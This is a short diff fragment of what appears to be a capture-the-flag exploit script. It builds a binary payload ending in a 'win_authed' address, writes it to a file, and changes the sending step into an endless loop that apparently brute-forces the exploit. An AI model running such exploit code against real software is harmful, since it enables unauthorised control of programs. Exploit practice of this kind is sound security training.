@@ -83,7 +83,6 @@ payload += p8(second_offset)
 # payload += p32(0x0)
 payload += win_authed
 open("payload", "wb").write(payload)
-# for i in range(50):
-    # payload += b"a"*i
-full_send() 
+while (True):
+    full_send()     
     
